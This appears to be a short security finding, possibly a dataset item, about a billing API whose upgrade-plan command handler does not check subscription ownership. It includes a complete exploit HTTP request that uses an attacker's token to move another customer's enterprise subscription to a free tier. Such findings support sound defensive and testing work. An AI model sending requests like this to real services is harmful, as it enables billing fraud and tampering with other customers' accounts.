diagnosis: The command handler appends a SubscriptionPlanChanged event to the subscription stream without verifying that the caller owns subscriptionId. Any authenticated user can modify billing plans or apply discounts to competitor enterprise accounts.
exploit_request:
POST /api/commands/upgrade-plan HTTP/1.1
Host: billing.saasplatform.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"subscriptionId": "sub_enterprise_cust_4401", "newPlanTier": "ENTERPRISE_FREE_TIER", "promoCode": "ZERO_DOLLAR"}
